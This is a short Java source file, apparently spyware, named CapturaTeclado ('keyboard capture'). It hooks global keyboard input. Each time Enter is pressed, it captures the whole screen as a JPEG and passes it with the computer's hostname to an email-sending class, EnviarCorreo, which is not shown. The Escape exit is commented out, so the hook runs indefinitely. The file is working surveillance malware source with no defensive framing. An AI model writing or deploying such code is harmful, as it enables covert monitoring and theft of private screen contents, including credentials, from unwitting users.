
import lc.kra.system.keyboard.GlobalKeyboardHook;
import lc.kra.system.keyboard.event.GlobalKeyAdapter;
import lc.kra.system.keyboard.event.GlobalKeyEvent;
import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.InetAddress;

import javax.imageio.ImageIO;

public class CapturaTeclado {

	private static boolean run = true;

	public static void main(String[] args) {
		// Might throw a UnsatisfiedLinkError if the native library fails to load or a
		// RuntimeException if hooking fails
																	
		GlobalKeyboardHook keyboardHook = new GlobalKeyboardHook(true); // Use false here to switch to hook instead of
																		// raw input
		
		keyboardHook.addKeyListener(new GlobalKeyAdapter() {
			@Override
			public void keyPressed(GlobalKeyEvent event) {
				
				if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_ESCAPE) {
					//run = false;
				}
				if (event.getVirtualKeyCode() == GlobalKeyEvent.VK_RETURN) {

					try {
						Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
						Rectangle screenRectangle = new Rectangle(screenSize);
						Robot robot;
						robot = new Robot();
						BufferedImage image = robot.createScreenCapture(screenRectangle);
						ByteArrayOutputStream baos = new ByteArrayOutputStream();
						ImageIO.write(image, "jpg", baos);
						byte[] byteImage = baos.toByteArray();
						baos.flush();
						baos.close();
						new EnviarCorreo(byteImage,InetAddress.getLocalHost().getHostName());
					} catch (AWTException e) {
						e.printStackTrace();
					} catch (IOException e) {
						e.printStackTrace();
					} catch (Exception e) {
						e.printStackTrace();
					}

				}

			}

			@Override
			public void keyReleased(GlobalKeyEvent event) {}
		});

		try {
			while (run) {
				Thread.sleep(500);
			}
		} catch (InterruptedException e) {
			e.printStackTrace();
		} finally {
			keyboardHook.shutdownHook();
		}
	}
}